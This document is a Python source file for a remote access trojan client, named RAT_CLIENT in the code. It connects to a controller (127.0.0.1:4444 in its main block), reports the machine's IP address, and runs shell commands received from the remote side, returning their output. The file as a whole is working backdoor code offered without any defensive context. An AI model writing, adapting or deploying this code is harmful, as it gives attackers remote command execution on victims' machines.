import socket
import os
import subprocess
import threading
import queue
from enum import Enum

class Command(Enum):
    SHELL = '1'
    PROC = '2'
    EXIT = '3'


class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.on_client_connected = None
        self.send_buf = queue.Queue()
        self.shell = threading.Thread(target=self.run_shell)
        self.shell_buf = queue.Queue()
        
    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())
    
    
    
    def excute(self):
        send_thread = threading.Thread(target=self.send_message)
        rev_thread = threading.Thread(target=self.recv_message)
        send_thread.start()
        rev_thread.start()
        send_thread.join()
        rev_thread.join()
        
    def send_message(self):
        while True:
            try:
                if self.send_buf.empty() is False:
                    msg = self.send_buf.get()
                    s.send(msg.encode())
            except Exception as e:
                break
    
    def recv_message(self):
        command_handers = {
            Command.SHELL.value: self.handle_shell_command,
            Command.PROC.value: self.handle_proc_command,
            Command.EXIT.value: self.handle_exit_command
        }
        while True:
            try:
                msg = s.recv(1024).decode()
                command = msg[0]
                handler = command_handers.get(command)
                handler(msg[1:])
            except Exception as e:
                break
            

    def handle_shell_command(self, command):
        if self.shell.is_alive() is False:
            self.shell.start()
        self.shell_buf.put(command)
        
        
    def handle_proc_command(self, command):
        pass

    def handle_exit_command(self, command):
        self.send_buf.put('exit')
        self.shell.join()
        s.close()

    def run_shell(self):
        while True:
            if self.shell_buf.empty() is False:
                command = self.shell_buf.get()
                if command == 'exit':
                    break
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                self.send_buf.put(Command.SHELL.value+result.stdout)
                self.send_buf.put(Command.SHELL.value+result.stderr)
        
                    
    
if __name__ == "__main__":
    host = "127.0.0.1"
    port = 4444
    rat = RAT_CLIENT(host, port)
    rat.build_connection()
    rat.excute()